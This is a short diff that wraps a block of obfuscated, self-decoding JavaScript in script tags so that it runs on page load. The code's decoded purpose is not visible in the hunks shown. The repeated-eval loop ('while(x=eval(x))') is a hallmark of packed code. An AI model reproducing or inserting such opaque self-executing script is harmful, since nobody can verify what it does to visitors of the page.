@@ -1,4 +1,4 @@
-
+<script type="text/javascript">
 //<![CDATA[
 <!--
 var x="function f(x,y){var i,o=\"\",l=x.length;for(i=0;i<l;i++){if(i==65)y+=" +
@@ -58,4 +58,4 @@ var x="function f(x,y){var i,o=\"\",l=x.length;for(i=0;i<l;i++){if(i==65)y+=" +
 while(x=eval(x));
 //-->
 //]]>
-
+</script>
